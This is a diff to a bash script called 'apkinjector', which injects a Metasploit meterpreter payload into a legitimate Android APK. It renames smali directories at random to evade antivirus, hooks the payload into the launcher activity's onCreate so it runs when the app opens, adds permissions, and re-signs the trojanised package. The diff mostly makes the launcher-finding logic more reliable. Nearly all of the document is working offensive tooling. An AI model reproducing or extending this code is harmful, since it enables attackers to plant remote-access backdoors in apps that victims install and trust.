@@ -3,7 +3,7 @@
 # Author: Justin Breed
 # Filename: apkinjector
 # Purpose: AV Evasion along with injecting a meterpreter payload into another apk file
-# AV Bypass: 0% detection as of 16Feb17
+# Date: 0% detection as of 16Feb17
 
 if [ $# -lt 2 ] || [ ${1: -4} != ".apk" ] || [ ${2: -4} != ".apk" ]; then
     echo
@@ -34,6 +34,8 @@ VAR1=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
 VAR2=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
 VAR3=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Payload.smali renaming
 JAR=`which apktool.jar`
+smaliFile=""
+lineNumber=""
 
 #APKTool to pull apart the package
 java -jar $JAR d -f -o /tmp/payload $fullPathPayload
@@ -55,36 +57,55 @@ sed -i "s#payload#loader#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 #copy over payload files into the original apk files
 cp -r /tmp/payload/smali/com/$VAR1 /tmp/original/smali/com/.
 
-#locate the launcher smali
-cat /tmp/original/AndroidManifest.xml | grep @string/app_name | grep android:name=\"com. | grep \<activity\ android: > /tmp/output
-grep -oP 'com.*." ' /tmp/output | awk 'NR==1{print $1}' > /tmp/output_1 	# breaks apart the com object
-sed -i 's#"##' /tmp/output_1  			        # gets rid of the “
-sed -i 's/\./\//g' /tmp/output_1                        # Replaces all "." with "/"
+#locate the launcher .smali. We are looking for the MAIN being called directly before LAUNCHER. We then take this line number and begin looping backwards through the file to find the android name of the .smali file we need to inject into.
+#lineNumber=`perl -lne 'print $.,":",$_ if /android.intent.action.MAIN/ .. /LAUNCHER/' /tmp/original/AndroidManifest.xml | cut -d: -f1 | awk 'NR==1{print $1}'`
+lineNumber=`grep -n -A 1 android.intent.action.MAIN /tmp/original/AndroidManifest.xml | grep android.intent.category.LAUNCHER | cut -d- -f1`
+let lineNumber-=1
+echo -e "\033[34m Line number of AndroidManifest.xml MAIN: $lineNumber \x1B[0m"
+until [  $lineNumber -eq 1 ] || [[ ! -z "${smaliFile// }" ]]; do
+    smaliFile=`sed -n "$lineNumber p" /tmp/original/AndroidManifest.xml | grep android:label=\"@string/app_name\" | grep android:name=\"`
+    let lineNumber-=1
+done
+echo -e "\033[34m $smaliFile \x1B[0m"
+echo -e "\033[34m Left until loop at line number: $lineNumber \x1B[0m"
+echo $smaliFile > /tmp/output
+grep -o -P '(?<=android:name=").*(?=")' /tmp/output | awk 'NR==1{print $1}' > /tmp/output_1  		# grabs just what we need from the string 
+cat /tmp/output_1
+sed -i 's#"##' /tmp/output_1							# Gets rid of extra quote
+sed -i 's/\./\//g' /tmp/output_1                        			# Replaces all "." with "/"
 sed -i 's/[ \t]*$//' /tmp/output_1                  
-launcherSmali=`cat /tmp/output_1`.smali                 # Stores the result as a variable and appends ".smali"
-if [ \! -s /tmp/output_1 ]; then 
+launcherSmali=`cat /tmp/output_1`.smali                 			# Stores the result as a variable and appends ".smali"
+echo $launcherSmali
+
+#Check if automatic searching worked. If not, then prompt the user to allow manual entry.
+#Check if no recorded output OR if the file it thinks is correct is actually present.
+if [ \! -s /tmp/output_1 ] || [ ! -f /tmp/original/smali/$launcherSmali ] ; then 
     echo; echo
-    echo "Running grep -B 7 -A 2 MAIN /tmp/original/AndroidManifest.xml"
+    echo "Running grep -B 7 -A 2 -n MAIN /tmp/original/AndroidManifest.xml"
     echo "This is to assist in manually finding the smali file to inject into"
     echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
     # a little visual aid to find the .smali file easily without manually navigating
-    grep -B 7 -A 2 MAIN /tmp/original/AndroidManifest.xml 
+    grep -B 7 -A 2 -n MAIN /tmp/original/AndroidManifest.xml 
     echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
     echo;echo
     echo -e "\033[31m Was unable to locate the .smali launcher in AndroidManifest.xml with the current grep command in place \x1B[0m"
     echo "Locate MAIN/LAUNCHER functions in /tmp/original/AndroidManifest.xml. Above you will find the path to the .smali file"
     echo
-    echo "Example: com/path1/path2/MainActivity.smali"
+    echo "Example prompt input: smali/com/path1/path2/MainActivity.smali"
     read -p 'Location of MAIN/LAUNCHER .smali file: ' launcherSmali
-    if [ ! -f /tmp/original/smali/$launcherSmali ]; then
-        echo -e "\033[31m Was unable to locate the .smali file. Please verify the path manually to the .smali file is present in the /tmp/original/smali directory. Also, be sure to include the .smali file extension in the prompt.\x1B[0m"
+    if [ ! -f /tmp/original/$launcherSmali ]; then
+        echo -e "\033[31m Was unable to locate the .smali file. Please verify the path manually to the .smali file is present in the /tmp/original/<smali> directory. Also, be sure to include the .smali file extension in the prompt.\x1B[0m"
+	echo -e "\033[34m It is good to navigate through the .smali file structure to verify the file is actually present if you are running into issues. \x1B[0m"
     fi
 else
-    echo -e "\033[32m Found smali launcher in AndroidManifest.xml: $launcherSmali \x1B[0m"
+    echo -e "\033[32m Found smali in AndroidManifest.xml: $launcherSmali \x1B[0m"
+    launcherSmali=smali/$launcherSmali
 fi
 
 #add invoke to launching .smali file to call the payload upon app launch
-sed -i "/onCreate(Landroid/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/smali/$launcherSmali
+sed -i "/onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
+lineNumber=`grep .method /tmp/original/$launcherSmali | grep onCreate\(Landroid/os/Bundle\;\)V`
+#sed -i "$lineNumberi invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
 
 #add all dependencies... because, why not?
 sed -i "/platformBuildVersionName/a<uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>" /tmp/original/AndroidManifest.xml
@@ -124,6 +145,8 @@ echo
 #Check if the injected file was successful in being created
 if [ ! -f /tmp/original/dist/$originalApk ]; then
     echo -e "\033[31m There was a problem in the creation of the injected APK file. Review the output to see where the issue was. Also, review /tmp/original files to see what could have potentially caused APKTool to fail.\x1B[0m"
+    echo -e "\033[33m Attempt to decompile and build the .apk file using apktool manually to see if it is successful before any modifications take place. \x1B[0m"
+    echo -e "\033[33m Ex: java -jar /usr/local/bin/apktool.jar d -f -o outputfolder <com.object>.apk ; java -jar /usr/local/bin/apktool.jar b outputfolder \x1B[0m"
     rm -rf /tmp/payload
     #rm -rf /tmp/original
     rm /tmp/output
@@ -152,11 +175,11 @@ echo -e "\033[34m Attempting to sign the package with your android debug key \x1
 jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA injected_$originalApk androiddebugkey
 echo
 echo -e "\033[34m Signed the .apk file with ~/.android/debug.keystore \x1B[0m"
-echo "Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key"
+echo -e "\033[34m Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key \x1B[0m"
 echo
 echo -e "\033[34m Cleaning up \x1B[0m"
 rm -rf /tmp/payload
-rm -rf /tmp/original
+#rm -rf /tmp/original
 rm /tmp/output
 rm /tmp/output_1
 echo -e "\033[32m Finished! \x1B[0m"
